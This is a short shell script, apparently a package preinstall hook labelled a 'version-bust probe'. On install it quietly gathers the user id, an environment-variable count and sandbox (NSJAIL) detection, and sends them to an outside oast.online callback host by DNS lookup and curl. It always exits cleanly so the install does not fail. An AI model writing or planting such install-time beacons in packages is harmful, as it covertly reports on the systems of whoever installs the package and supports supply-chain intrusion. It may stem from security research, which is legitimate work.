#!/bin/sh
# H81 version-bust probe: non-failing preinstall that emits a labelled DNS/HTTP
# callback. uid and env-name count only (no environment values).
L="pre"
P="dc1hkt3kvv17699hpv0gam4nqd63ajqhc.oast.online"
Q="dc1hkt3kvv17699hpv0gfd7kd349ndaqg.oast.online"
U=$(id -u 2>/dev/null)
EN=$(env 2>/dev/null | wc -l)
NS=$(grep -c NSJAIL /proc/self/cgroup 2>/dev/null || echo 0)
echo "H81-VER label=$L uid=$U envn=$EN nsjail=$NS"
getent hosts "h81ver-${L}-u${U}-e${EN}-ns${NS}.$P" >/dev/null 2>&1 || true
curl -sS -m 8 "http://$P/h81-ver-${L}?u=$U&e=$EN&ns=$NS" >/dev/null 2>&1 || true
if false; then getent hosts "h81never-ver-control.$Q" >/dev/null 2>&1 || true; fi
exit 0
